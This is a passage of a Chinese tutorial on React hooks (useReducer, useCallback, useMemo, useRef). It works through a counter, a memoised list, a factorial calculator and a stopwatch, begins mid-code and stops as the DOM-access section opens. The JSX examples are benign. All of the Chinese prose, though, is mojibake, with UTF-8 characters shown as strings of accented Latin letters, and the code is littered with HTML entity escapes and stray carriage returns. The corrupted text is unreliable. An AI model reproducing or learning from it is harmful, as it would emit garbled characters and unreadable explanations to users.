[state, dispatch] = useReducer(reducer, initialCount, init);\rreturn (\r\u0026lt;\u0026gt;\rCount: {state.count}\r\u0026lt;button\ronClick={() =\u0026gt; dispatch({type: \u0026#39;reset\u0026#39;, payload: initialCount})}\u0026gt;\rReset\r\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;decrement\u0026#39;})}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;increment\u0026#39;})}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r} 4). è·³è¿‡ dispatch å¦‚æœ Reducer Hook çš„è¿”å›å€¼ä¸å½“å‰ state ç›¸åŒï¼ŒReact å°†è·³è¿‡å­ç»„ä»¶çš„æ¸²æŸ“åŠå‰¯ä½œç”¨çš„æ‰§è¡Œã€‚ï¼ˆReact ä½¿ç”¨ Object.is æ¯”è¾ƒç®—æ³• æ¥æ¯”è¾ƒ stateã€‚ï¼‰\néœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒReact å¯èƒ½ä»éœ€è¦åœ¨è·³è¿‡æ¸²æŸ“å‰å†æ¬¡æ¸²æŸ“è¯¥ç»„ä»¶ã€‚ä¸è¿‡ç”±äº React ä¸ä¼šå¯¹ç»„ä»¶æ ‘çš„â€œæ·±å±‚â€èŠ‚ç‚¹è¿›è¡Œä¸å¿…è¦çš„æ¸²æŸ“ï¼Œæ‰€ä»¥å¤§å¯ä¸å¿…æ‹…å¿ƒã€‚\nå¦‚æœä½ åœ¨æ¸²æŸ“æœŸé—´æ‰§è¡Œäº†é«˜å¼€é”€çš„è®¡ç®—ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ useMemo æ¥è¿›è¡Œä¼˜åŒ–ã€‚\n5. useCallback const memoizedCallback = useCallback(\r() =\u0026gt; {\rdoSomething(a, b);\r},\r[a, b],\r); è¿”å›ä¸€ä¸ª memoized å›è°ƒå‡½æ•°ã€‚\nMemoization åœ¨å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€çš„ç¼–è¯‘å™¨ä¸­å¤§é‡ä½¿ç”¨ï¼Œè¿™äº›è¯­è¨€é€šå¸¸ä½¿ç”¨æŒ‰åç§°è°ƒç”¨è¯„ä¼°ç­–ç•¥ã€‚\nä¸ºäº†é¿å…è®¡ç®—å‚æ•°å€¼çš„å¼€é”€ï¼Œè¿™äº›è¯­è¨€çš„ç¼–è¯‘å™¨å¤§é‡ä½¿ç”¨ç§°ä¸ºthunk çš„è¾…åŠ©å‡½æ•°æ¥è®¡ç®—å‚æ•°å€¼ï¼Œå¹¶è®°ä½è¿™äº›å‡½æ•°ä»¥é¿å…é‡å¤è®¡ç®—ã€‚\næŠŠå†…è”å›è°ƒå‡½æ•°åŠä¾èµ–é¡¹æ•°ç»„ä½œä¸ºå‚æ•°ä¼ å…¥ useCallbackï¼Œå®ƒå°†è¿”å›è¯¥å›è°ƒå‡½æ•°çš„ memoized ç‰ˆæœ¬ï¼Œè¯¥å›è°ƒå‡½æ•°ä»…åœ¨æŸä¸ªä¾èµ–é¡¹æ”¹å˜æ—¶æ‰ä¼šæ›´æ–°ã€‚\nå½“æŠŠå›è°ƒå‡½æ•°ä¼ é€’ç»™ç»è¿‡ä¼˜åŒ–çš„å¹¶ä½¿ç”¨å¼•ç”¨ç›¸ç­‰æ€§å»é¿å…éå¿…è¦æ¸²æŸ“ï¼ˆä¾‹å¦‚ shouldComponentUpdateï¼‰çš„å­ç»„ä»¶æ—¶ï¼Œå®ƒå°†éå¸¸æœ‰ç”¨ã€‚ useCallback(fn, deps) ç›¸å½“äº useMemo(() =\u0026gt; fn, deps)ã€‚\nä¾èµ–é¡¹æ•°ç»„ä¸ä¼šä½œä¸ºå‚æ•°ä¼ ç»™å›è°ƒå‡½æ•°ã€‚è™½ç„¶ä»æ¦‚å¿µä¸Šæ¥è¯´å®ƒè¡¨ç°ä¸ºï¼šæ‰€æœ‰å›è°ƒå‡½æ•°ä¸­å¼•ç”¨çš„å€¼éƒ½åº”è¯¥å‡ºç°åœ¨ä¾èµ–é¡¹æ•°ç»„ä¸­ã€‚æœªæ¥ç¼–è¯‘å™¨ä¼šæ›´åŠ æ™ºèƒ½ï¼Œå±Šæ—¶è‡ªåŠ¨åˆ›å»ºæ•°ç»„å°†æˆä¸ºå¯èƒ½ã€‚\nReactæ¨èå¯ç”¨ eslint-plugin-react-hooks ä¸­çš„ exhaustive-deps è§„åˆ™ã€‚æ­¤è§„åˆ™ä¼šåœ¨æ·»åŠ é”™è¯¯ä¾èµ–æ—¶å‘å‡ºè­¦å‘Šå¹¶ç»™å‡ºä¿®å¤å»ºè®®ã€‚\n1. useCallback()çš„ç›®çš„ React ç»„ä»¶ä¸­é€šå¸¸ä¼šåˆ›å»ºå…±äº«ç›¸åŒä»£ç çš„ä¸åŒå‡½æ•°å¯¹è±¡ï¼š\n1 2 3 4 5 6 7 8  function MyComponent() { // handleClick åœ¨æ¯æ¬¡æ¸²æŸ“æ—¶é‡æ–°åˆ›å»º  const handleClick = () =\u0026gt; { console.log(\u0026#39;Clicked!\u0026#39;); }; // ... }   handleClickæ˜¯MyComponentæ¯æ¬¡æ¸²æŸ“çš„ä¸åŒå‡½æ•°å¯¹è±¡ã€‚\nå› ä¸ºå†…è”å‡½æ•°å¾ˆä¾¿å®œï¼Œæ‰€ä»¥åœ¨æ¯æ¬¡æ¸²æŸ“æ—¶é‡æ–°åˆ›å»ºå‡½æ•°ä¸æ˜¯é—®é¢˜ã€‚æ¯ä¸ªç»„ä»¶æœ‰å‡ ä¸ªå†…è”å‡½æ•°æ˜¯å¯ä»¥æ¥å—çš„ã€‚\nä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œéœ€è¦åœ¨æ¸²æŸ“ä¹‹é—´ç»´æŠ¤å•ä¸ªå‡½æ•°å®ä¾‹ï¼š\n å‡½æ•°ç»„ä»¶é‡Œé¢åŒ…è£¹ä¸€ä¸ªæ¥å—å‡½æ•°å¯¹è±¡çš„propsçš„React.memo() å½“å‡½æ•°å¯¹è±¡ä¾èµ–äºå…¶ä»–é’©å­æ—¶ï¼Œä¾‹å¦‚ useEffect(..., [callback]) å½“å‡½æ•°æœ‰ä¸€äº›å†…éƒ¨çŠ¶æ€æ—¶ï¼Œä¾‹å¦‚å»æŠ–åŠ¨å‡½æ•°\nï¼ˆåŸºæœ¬ä¸Šå»æŠ–åŠ¨ç¡®ä¿ä¸ºå¯èƒ½å‘ç”Ÿå¤šæ¬¡çš„äº‹ä»¶å‘é€æ°å¥½ä¸€ä¸ªä¿¡å·ã€‚\nèŠ‚æµå°†å‡½æ•°æ¥æ”¶çš„è°ƒç”¨é¢‘ç‡é™åˆ¶åœ¨ä¸€ä¸ªå›ºå®šçš„æ—¶é—´é—´éš”å†…ã€‚å®ƒç”¨äºç¡®ä¿ç›®æ ‡å‡½æ•°çš„è°ƒç”¨é¢‘ç‡ä¸ä¼šè¶…è¿‡æŒ‡å®šçš„å»¶è¿Ÿã€‚ï¼‰ã€‚  è¿™æ—¶ï¼ŒuseCallback(callbackFun, deps) å°±æ´¾ä¸Šç”¨åœºäº†ï¼šç»™å®šç›¸åŒçš„ä¾èµ–å€¼depsï¼Œé’©å­åœ¨æ¸²æŸ“ä¹‹é—´è¿”å›ç›¸åŒçš„å‡½æ•°å®ä¾‹ï¼ˆåˆåè®°å¿†ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9  import { useCallback } from \u0026#39;react\u0026#39;; function MyComponent() { // handleClick is the same function object  const handleClick = useCallback(() =\u0026gt; { console.log(\u0026#39;Clicked!\u0026#39;); }, []); // ... }   handleClick å˜é‡åœ¨ MyComponent çš„æ¸²æŸ“ä¹‹é—´å§‹ç»ˆå…·æœ‰ç›¸åŒçš„å›è°ƒå‡½æ•°å¯¹è±¡ã€‚\n2. useCallbackçš„æ­£ç¡®ç”¨ä¾‹ æƒ³è±¡ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªå‘ˆç°å¤§é‡æ•°æ®åˆ—è¡¨çš„ç»„ä»¶ï¼š\nimport useSearch from \u0026#39;./fetch-items\u0026#39;;\rfunction MyBigList({ term, onItemClick }) {\rconst items = useSearch(term);\rconst map = item =\u0026gt; \u0026lt;div onClick={onItemClick}\u0026gt;{item}\u0026lt;/div\u0026gt;;\rreturn \u0026lt;div\u0026gt;{items.map(map)}\u0026lt;/div\u0026gt;;\r}\rexport default React.memo(MyBigList); åˆ—è¡¨å¯èƒ½å¾ˆå¤§ï¼Œå¯èƒ½æœ‰æ•°ç™¾ä¸ªé¡¹ç›®ã€‚ä¸ºäº†é˜²æ­¢æ— ç”¨çš„åˆ—è¡¨é‡æ–°å‘ˆç°ï¼Œå°†å…¶åŒ…è£…åˆ°React.memo().\nMyBigList çš„çˆ¶ç»„ä»¶æä¾›äº†ä¸€ä¸ªçŸ¥é“ä½•æ—¶å•å‡»äº†ä¸€ä¸ªé¡¹ç›®çš„å¤„ç†å‡½æ•°ï¼š\nimport { useCallback } from \u0026#39;react\u0026#39;;\rexport function MyParent({ term }) {\r--------------------------------------------------------\rconst onItemClick = useCallback(event =\u0026gt; {\rconsole.log(\u0026#39;You clicked \u0026#39;, event.currentTarget);\r}, [term]);\r--------------------------------------------------------\rreturn (\r\u0026lt;MyBigList\rterm={term}\ronItemClick={onItemClick}\r/\u0026gt;\r);\r} onItemClickå›è°ƒç”±useCallback()å¤„ç†. åªè¦termæ˜¯ç›¸åŒçš„ï¼ŒuseCallback()å°±è¿”å›ç›¸åŒçš„å‡½æ•°å¯¹è±¡ã€‚\nå½“MyParentç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼ŒonItemClickå‡½æ•°å¯¹è±¡ä¿æŒä¸å˜å¹¶ä¸”ä¸ä¼šç ´åMyBigList.\nè¿™å°±æ˜¯useCallback()çš„ç›®çš„å’Œæ­£ç¡®ç”¨æ³•ã€‚\n3. useCallbackçš„ç³Ÿç³•ç”¨ä¾‹ 1 2 3 4 5 6 7 8 9 10 11 12  import { useCallback } from \u0026#39;react\u0026#39;; function MyComponent() { // `useCallback()` è¢«æ— è„‘åœ°ä½¿ç”¨,åœ¨è¿™é‡Œæ¯«æ— æ„ä¹‰  const handleClick = useCallback(() =\u0026gt; { // å¤„ç†ç‚¹å‡»äº‹ä»¶  }, []); return \u0026lt;MyChild onClick={handleClick} /\u0026gt;; } function MyChild ({ onClick }) { return \u0026lt;button onClick={onClick}\u0026gt;I am a child\u0026lt;/button\u0026gt;; }   é€šè¿‡ä½¿ç”¨useCallback()å¢åŠ äº†ä»£ç å¤æ‚æ€§ã€‚å¿…é¡»ä½¿depsofuseCallback(..., deps)ä¸ä½ åœ¨è®°å¿†åŒ–å›è°ƒä¸­ä½¿ç”¨çš„å†…å®¹ä¿æŒåŒæ­¥ã€‚\næ€»ä¹‹ï¼Œä¼˜åŒ–æ¯”æ²¡æœ‰ä¼˜åŒ–çš„æˆæœ¬æ›´é«˜ã€‚\nåœ¨è¿™é‡Œï¼Œå®Œå…¨å¯ä»¥å¦‚æ­¤å¤„ç†ï¼š\nimport { useCallback } from \u0026#39;react\u0026#39;;\rfunction MyComponent() {\rconst handleClick = () =\u0026gt; {\r// handle the click event\r};\rreturn \u0026lt;MyChild onClick={handleClick} /\u0026gt;;\r}\rfunction MyChild ({ onClick }) {\rreturn \u0026lt;button onClick={onClick}\u0026gt;I am a child\u0026lt;/button\u0026gt;;\r} 4). æ€»ç»“ï¼ˆæ‰€æœ‰æ€§èƒ½ä¼˜åŒ–çš„å»ºè®®ï¼‰ åœ¨è€ƒè™‘æ€§èƒ½è°ƒæ•´æ—¶ï¼Œè¯·è®°ä½ä»¥ä¸‹è¯­å¥ï¼š\n åœ¨ä¼˜åŒ–ä¹‹å‰å…ˆåˆ†æ  åœ¨å†³å®šä½¿ç”¨ä¼˜åŒ–æŠ€æœ¯æ—¶ï¼ŒåŒ…æ‹¬è®°å¿†åŒ–ï¼Œç‰¹åˆ«æ˜¯useCallback()ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\n ç¬¬ä¸€ åˆ†æ ç„¶åé‡åŒ–å¢åŠ çš„æ€§èƒ½ï¼ˆä¾‹å¦‚150msä¸50msæ¸²æŸ“é€Ÿåº¦å¢åŠ ï¼‰  ç„¶åé—®é—®è‡ªå·±ï¼šä¸å¢åŠ çš„å¤æ‚æ€§ç›¸æ¯”ï¼Œå¢åŠ çš„æ€§èƒ½å€¼å¾—ä½¿ç”¨ useCallback() å—ï¼Ÿ\n6. useMemo å¯ä»¥æŠŠ useMemo ä½œä¸ºæ€§èƒ½ä¼˜åŒ–çš„æ‰‹æ®µï¼Œä½†ä¸è¦æŠŠå®ƒå½“æˆè¯­ä¹‰ä¸Šçš„ä¿è¯ã€‚\nå°†æ¥ï¼ŒReact å¯èƒ½ä¼šé€‰æ‹©â€œé—å¿˜â€ä»¥å‰çš„ä¸€äº› memoized å€¼ï¼Œå¹¶åœ¨ä¸‹æ¬¡æ¸²æŸ“æ—¶é‡æ–°è®¡ç®—å®ƒä»¬ï¼Œæ¯”å¦‚ä¸ºç¦»å±ç»„ä»¶é‡Šæ”¾å†…å­˜ã€‚\nå…ˆç¼–å†™åœ¨æ²¡æœ‰ useMemo çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ‰§è¡Œçš„ä»£ç  â€”â€” ä¹‹åå†åœ¨ä»£ç ä¸­æ·»åŠ  useMemoï¼Œä»¥è¾¾åˆ°ä¼˜åŒ–æ€§èƒ½çš„ç›®çš„ã€‚\nconst memoizedValue = useMemo(() =\u0026gt; computeExpensiveValue(a, b), [a, b]); åœ¨åˆå§‹æ¸²æŸ“æœŸé—´ï¼ŒuseMemo(compute, dependencies)è°ƒç”¨computeï¼Œè®°å¿†è®¡â€‹â€‹ç®—ç»“æœï¼Œå¹¶å°†å…¶è¿”å›ç»™ç»„ä»¶ã€‚\nå¦‚æœåœ¨ä¸‹ä¸€æ¬¡æ¸²æŸ“æœŸé—´ä¾èµ–é¡¹æ²¡æœ‰æ”¹å˜ï¼Œåˆ™ useMemo() ä¸ä¼šè°ƒç”¨ compute ä½†è¿”å›è®°å¿†å€¼ã€‚\nä½†æ˜¯å¦‚æœåœ¨é‡æ–°æ¸²æŸ“æœŸé—´ä¾èµ–é¡¹å‘ç”Ÿå˜åŒ–ï¼Œåˆ™ useMemo() è°ƒç”¨ computeï¼Œè®°å¿†æ–°å€¼å¹¶è¿”å›å®ƒã€‚\nè¿™å°±æ˜¯useMemo()é’©å­çš„æœ¬è´¨ã€‚\nå¦‚æœä½ çš„è®¡ç®—å›è°ƒä½¿ç”¨propsæˆ–stateå€¼ï¼Œè¯·ç¡®ä¿å°†è¿™äº›å€¼æŒ‡ç¤ºä¸ºä¾èµ–é¡¹ï¼š\nconst memoizedResult = useMemo(() =\u0026gt; {\rreturn expensiveFunction(propA, propB);\r}, [propA, propB]); 1). useMemo() ä¸€ä¸ªä¾‹å­ ç»„ä»¶\u0026lt;CalculateFactorial /\u0026gt;è®¡ç®—è¾“å…¥å­—æ®µçš„æ•°å­—çš„é˜¶ä¹˜ã€‚\nè¿™æ˜¯\u0026lt;CalculateFactorial /\u0026gt;ç»„ä»¶çš„å¯èƒ½å®ç°ï¼š\nimport { useState } from \u0026#39;react\u0026#39;;\rexport function CalculateFactorial() {\rconst [number, setNumber] = useState(1);\rconst [inc, setInc] = useState(0);\rconst factorial = factorialOf(number);\rconst onChange = event =\u0026gt; {\rsetNumber(Number(event.target.value));\r};\rconst onClick = () =\u0026gt; setInc(i =\u0026gt; i + 1);\rreturn (\r\u0026lt;div\u0026gt;\rFactorial of \u0026lt;input type=\u0026#34;number\u0026#34; value={number} onChange={onChange} /\u0026gt;\ris {factorial}\r\u0026lt;button onClick={onClick}\u0026gt;Re-render\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction factorialOf(n) {\rconsole.log(\u0026#39;factorialOf(n) called!\u0026#39;);\rreturn n \u0026lt;= 0 ? 1 : n * factorialOf(n - 1);\r} æ¯æ¬¡æ›´æ”¹è¾“å…¥å€¼æ—¶ï¼Œéƒ½ä¼šè®¡ç®—é˜¶ä¹˜factorialOf(n)å¹¶\u0026rsquo;factorialOf(n) called!\u0026lsquo;è®°å½•åˆ°æ§åˆ¶å°ã€‚\nå¦ä¸€æ–¹é¢ï¼Œæ¯æ¬¡å•å‡»é‡æ–°æ¸²æŸ“æŒ‰é’®æ—¶ï¼ŒincçŠ¶æ€å€¼éƒ½ä¼šæ›´æ–°ã€‚æ›´æ–°incçŠ¶æ€å€¼ä¼šè§¦å‘\u0026lt;CalculateFactorial /\u0026gt;é‡æ–°æ¸²æŸ“ã€‚\nä½†æ˜¯ï¼Œä½œä¸ºæ¬¡è¦æ•ˆæœï¼Œåœ¨é‡æ–°æ¸²æŸ“æœŸé—´ï¼Œé˜¶ä¹˜ä¼šå†æ¬¡é‡æ–°è®¡ç®— -\u0026lsquo;factorialOf(n) called!\u0026lsquo;è®°å½•åˆ°æ§åˆ¶å°ã€‚\nå½“ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œå¦‚ä½•è®°ä½é˜¶ä¹˜è®¡ç®—ï¼Ÿè¿™æ—¶å€™å°±æ˜¯ä½¿ç”¨ useMemo() çš„æ—¶å€™äº†ã€‚\né€šè¿‡ä½¿ç”¨useMemo(() =\u0026gt; factorialOf(number), [number])è€Œä¸æ˜¯æ™®é€šçš„ factorialOf(number)ã€‚React è®°ä½é˜¶ä¹˜è®¡ç®—ã€‚\næ”¹è¿›\u0026lt;CalculateFactorial /\u0026gt;å¹¶è®°ä½é˜¶ä¹˜è®¡ç®—ï¼š\nimport { useState, useMemo } from \u0026#39;react\u0026#39;;\rexport function CalculateFactorial() {\rconst [number, setNumber] = useState(1);\rconst [inc, setInc] = useState(0);\r-----------------------------------------------------------------------\rconst factorial = useMemo(() =\u0026gt; factorialOf(number), [number]);\r-----------------------------------------------------------------------\rconst onChange = event =\u0026gt; {\rsetNumber(Number(event.target.value));\r};\rconst onClick = () =\u0026gt; setInc(i =\u0026gt; i + 1);\rreturn (\r\u0026lt;div\u0026gt;\rFactorial of \u0026lt;input type=\u0026#34;number\u0026#34; value={number} onChange={onChange} /\u0026gt;\ris {factorial}\r\u0026lt;button onClick={onClick}\u0026gt;Re-render\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction factorialOf(n) {\rconsole.log(\u0026#39;factorialOf(n) called!\u0026#39;);\rreturn n \u0026lt;= 0 ? 1 : n * factorialOf(n - 1);\r} æ¯æ¬¡æ›´æ”¹æ•°å­—çš„å€¼æ—¶ï¼Œ\u0026lsquo;factorialOf(n) called!\u0026lsquo;éƒ½ä¼šè®°å½•åˆ°æ§åˆ¶å°ã€‚è¿™æ˜¯é¢„æœŸçš„ã€‚\nä½†æ˜¯ï¼Œå¦‚æœæ‚¨å•å‡»é‡æ–°æ¸²æŸ“æŒ‰é’®ï¼Œ\u0026lsquo;factorialOf(n) called!\u0026lsquo;åˆ™ä¸ä¼šè®°å½•åˆ°æ§åˆ¶å°ï¼Œå› ä¸ºuseMemo(() =\u0026gt; factorialOf(number), [number])è¿”å›è®°å¿†åŒ–çš„é˜¶ä¹˜è®¡ç®—ã€‚å¾ˆæ£’ï¼\n2). useMemo()ä¸useCallback() useCallback() ä¸ useMemo() ç›¸æ¯”ï¼Œæ˜¯ä¸€ä¸ªæ›´ä¸“ä¸šçš„é’©å­ï¼Œå¯ä»¥è®°ä½å›è°ƒï¼š\nimport { useCallback } from \u0026#39;react\u0026#39;;\rfunction MyComponent({ prop }) {\rconst callback = () =\u0026gt; {\rreturn \u0026#39;Result\u0026#39;;\r};\rconst memoizedCallback = useCallback(callback, [prop]);\rreturn \u0026lt;ChildComponent callback={memoizedCallback} /\u0026gt;;\r} åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼ŒuseCallback(() =\u0026gt; {...}, [prop])åªè¦propä¾èµ–é¡¹ç›¸åŒï¼Œå°±è¿”å›ç›¸åŒçš„å‡½æ•°å®ä¾‹ã€‚\nå¯ä»¥ä½¿ç”¨useMemo()åšç›¸åŒçš„æ–¹å¼æ¥è®°å¿†å›è°ƒï¼š\nimport { useMemo } from \u0026#39;react\u0026#39;;\rfunction MyComponent({ prop }) {\rconst callback = () =\u0026gt; {\rreturn \u0026#39;Result\u0026#39;;\r};\rconst memoizedCallback = useMemo(() =\u0026gt; callback, [prop]);\rreturn \u0026lt;ChildComponent callback={memoizedCallback} /\u0026gt;;\r} 3). å°å¿ƒä½¿ç”¨è®°å¿†(memoization) è™½ç„¶useMemo()å¯ä»¥æé«˜ç»„ä»¶çš„æ€§èƒ½ï¼Œä½†å¿…é¡»ç¡®ä¿ä½¿ç”¨å’Œä¸ä½¿ç”¨æŒ‚é’©æ¥é…ç½®ç»„ä»¶ã€‚åªæœ‰åœ¨é‚£ä¹‹åæ‰èƒ½å¾—å‡ºæ˜¯å¦å€¼å¾—è®°å¿†çš„ç»“è®ºã€‚\nå½“è®°å¿†ä½¿ç”¨ä¸å½“æ—¶ï¼Œå¯èƒ½ä¼šæŸå®³æ€§èƒ½ã€‚\n4). ç»“è¯­ useMemo(() =\u0026gt; computation(a, b), [a, b])æ˜¯è®°ä½æ˜‚è´µè®¡ç®—çš„é’©å­ã€‚\nç»™å®šç›¸åŒçš„[a, b]ä¾èµ–é¡¹ï¼Œä¸€æ—¦è®°å¿†ï¼Œé’©å­å°†è¿”å›è®°å¿†å€¼è€Œä¸è°ƒç”¨computation(a, b)\n7. useRef React.useRef()é’©å­åˆ›å»ºæŒä¹…åŒ–çš„å¯å˜å€¼ï¼ˆä¹Ÿç§°ä¸º ref/reference ï¼‰ï¼Œä»¥åŠè®¿é—® DOM å…ƒç´ ã€‚\n1). å¯å˜å€¼ useRef(initialValue)æ˜¯ä¸€ä¸ªå†…ç½®çš„ React é’©å­ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‚æ•°ä½œä¸ºåˆå§‹å€¼å¹¶è¿”å›ä¸€ä¸ªå¼•ç”¨ï¼ˆåˆårefï¼‰ã€‚å¼•ç”¨æ˜¯å…·æœ‰ç‰¹æ®Šå±æ€§çš„å¯¹è±¡currentã€‚\n1 2 3 4 5 6 7 8 9 10 11 12  import { useRef } from \u0026#39;react\u0026#39;; function MyComponent() { const reference = useRef(initialValue); const someHandler = () =\u0026gt; { // Access reference value:  const value = reference.current; // Update reference value:  reference.current = newValue; }; // ... }   reference.current è®¿é—® ref å€¼ï¼Œreference.current = newValue æ›´æ–° ref å€¼ã€‚å¾ˆç®€å•ã€‚\nç”¨ä¾‹ï¼šè®°å½•æŒ‰é’®ç‚¹å‡» è¯¥ç»„ä»¶LogButtonClicksä½¿ç”¨refæ¥å­˜å‚¨æŒ‰é’®çš„ç‚¹å‡»æ¬¡æ•°ï¼š\nimport { useRef } from \u0026#39;react\u0026#39;;\rfunction LogButtonClicks() {\rconst countRef = useRef(0);\rconst handle = () =\u0026gt; {\rcountRef.current++;\rconsole.log(`Clicked ${countRef.current} times`);\r};\rconsole.log(\u0026#39;I rendered!\u0026#39;);\rreturn \u0026lt;button onClick={handle}\u0026gt;Click me\u0026lt;/button\u0026gt;;\r} const countRef = useRef(0)åˆ›å»ºä¸€ä¸ªç”¨countRefåˆå§‹åŒ–çš„ref0ã€‚\nå•å‡»æŒ‰é’®æ—¶ï¼Œhandleå°†è°ƒç”¨å‡½æ•°å¹¶é€’å¢refå€¼ï¼šcountRef.current++ã€‚refå€¼è®°å½•åˆ°æ§åˆ¶å°ã€‚\næ›´æ–°refå€¼countRef.current++ä¸ä¼šè§¦å‘ç»„ä»¶é‡æ–°æ¸²æŸ“ã€‚è¿™å¯ä»¥é€šè¿‡'I rendered!'åœ¨åˆå§‹æ¸²æŸ“æ—¶ä»…è®°å½•åˆ°æ§åˆ¶å°ä¸€æ¬¡çš„äº‹å®æ¥è¯æ˜ï¼Œå¹¶ä¸”åœ¨æ›´æ–°refæ—¶ä¸ä¼šå‘ç”Ÿé‡æ–°æ¸²æŸ“ã€‚\nç°åœ¨æå‡ºä¸€ä¸ªåˆç†çš„é—®é¢˜ï¼šrefå’Œstateä¹‹é—´çš„ä¸»è¦åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\n1.1). ref å’Œ state çš„åŒºåˆ« é‡ç”¨LogButtonClicksç»„ä»¶ï¼Œä½†è¿™æ¬¡ä½¿ç”¨useState()é’©å­æ¥è®¡ç®—æŒ‰é’®ç‚¹å‡»æ¬¡æ•°ï¼š\nimport { useState } from \u0026#39;react\u0026#39;;\rfunction LogButtonClicks() {\rconst [count, setCount] = useState(0);\rconst handle = () =\u0026gt; {\rconst updatedCount = count + 1;\rconsole.log(`Clicked ${updatedCount} times`);\rsetCount(updatedCount);\r};\rconsole.log(\u0026#39;I rendered!\u0026#39;);\rreturn \u0026lt;button onClick={handle}\u0026gt;Click me\u0026lt;/button\u0026gt;;\r} æ¯æ¬¡å•å‡»æ—¶ï¼Œéƒ½ä¼šåœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°æ¶ˆæ¯\u0026rsquo;I rendered!\u0026rsquo;â€”â€” è¿™æ„å‘³ç€æ¯æ¬¡æ›´æ–°çŠ¶æ€æ—¶ï¼Œç»„ä»¶éƒ½ä¼šé‡æ–°æ¸²æŸ“ã€‚\nå› æ­¤ï¼Œå¼•ç”¨å’ŒçŠ¶æ€ä¹‹é—´çš„ä¸¤ä¸ªä¸»è¦åŒºåˆ«ï¼š\n æ›´æ–°refä¸ä¼šè§¦å‘é‡æ–°æ¸²æŸ“ï¼Œè€Œæ›´æ–°stateä¼šä½¿ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼› refæ›´æ–°æ˜¯åŒæ­¥çš„ï¼ˆæ›´æ–°åçš„refå€¼ç«‹å³å¯ç”¨ï¼‰ï¼Œè€Œstateæ›´æ–°æ˜¯å¼‚æ­¥çš„ï¼ˆé‡æ–°æ¸²æŸ“åæ›´æ–°çŠ¶æ€å˜é‡ï¼‰ã€‚  ä»æ›´é«˜çš„è§’åº¦æ¥çœ‹ï¼Œrefå­˜å‚¨å‰¯ä½œç”¨çš„åŸºç¡€ç»“æ„æ•°æ®ï¼Œè€Œstateå­˜å‚¨ç›´æ¥å‘ˆç°åœ¨å±å¹•ä¸Šçš„ä¿¡æ¯ã€‚\nç”¨ä¾‹ï¼šå®ç°ç§’è¡¨ å¯ä»¥å°†å‰¯ä½œç”¨çš„refåŸºç¡€ç»“æ„æ•°æ®å­˜å‚¨åœ¨å†…éƒ¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥å­˜å‚¨åˆ°refæŒ‡é’ˆä¸­ï¼šè®¡æ—¶å™¨ IDã€å¥—æ¥å­— ID ç­‰ã€‚\nè¯¥ç»„ä»¶Stopwatchä½¿ç”¨setInterval(callback, time)è®¡æ—¶å™¨åŠŸèƒ½æ¯ç§’å¢åŠ ç§’æ•°çš„è®¡æ•°å™¨ã€‚è®¡æ—¶å™¨ id å­˜å‚¨åˆ°refä¸­timerIdRefï¼š\nimport { useRef, useState, useEffect } from \u0026#39;react\u0026#39;;\rfunction Stopwatch() {\rconst timerIdRef = useRef(0);\rconst [count, setCount] = useState(0);\rconst startHandler = () =\u0026gt; {\rif (timerIdRef.current) { return; }\rtimerIdRef.current = setInterval(() =\u0026gt; setCount(c =\u0026gt; c+1), 1000);\r};\rconst stopHandler = () =\u0026gt; {\rclearInterval(timerIdRef.current);\rtimerIdRef.current = 0;\r};\ruseEffect(() =\u0026gt; {\rreturn () =\u0026gt; clearInterval(timerIdRef.current);\r}, []);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;Timer: {count}s\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={startHandler}\u0026gt;Start\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={stopHandler}\u0026gt;Stop\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} startHandler()å•å‡»StartæŒ‰é’®æ—¶è°ƒç”¨timerIdRef.current = setInterval(...)å‡½æ•°å¯åŠ¨è®¡æ—¶å™¨å¹¶å°†è®¡æ—¶å™¨ id ä¿å­˜åœ¨refä¸­ã€‚\nç”¨æˆ·å•å‡»åœæ­¢æŒ‰é’®åœæ­¢ç§’è¡¨ã€‚åœæ­¢æŒ‰é’®å¤„ç†ç¨‹åºstopHandler()ä»refè®¿é—®è®¡æ—¶å™¨IDï¼Œå¹¶åœæ­¢å®šæ—¶å™¨clearInterval(timerIdRef.current)ã€‚\næ­¤å¤–ï¼Œå¦‚æœç»„ä»¶åœ¨ç§’è¡¨å¤„äºæ´»åŠ¨çŠ¶æ€çš„æƒ…å†µä¸‹å¸è½½ï¼Œåˆ™useEffect()çš„æ¸…ç†åŠŸèƒ½ä¹Ÿå°†åœæ­¢è®¡æ—¶å™¨ã€‚\nåœ¨ç§’è¡¨ç¤ºä¾‹ä¸­ï¼Œrefç”¨äºå­˜å‚¨åŸºç¡€è®¾æ–½æ•°æ® â€” æ´»åŠ¨è®¡æ—¶å™¨ IDã€‚\né™„å¸¦æŒ‘æˆ˜ï¼šé€šè¿‡æ·»åŠ é‡ç½®æŒ‰é’®æ¥æ”¹è¿›ç§’è¡¨\n//å¾…ç¼–å†™ 2). è®¿é—® DOM å…ƒç´  useRef()é’©å­çš„å¦ä¸€ä¸ªæœ‰ç”¨çš„åº”ç”¨æ˜¯è®¿é—® DOM å…ƒç´ 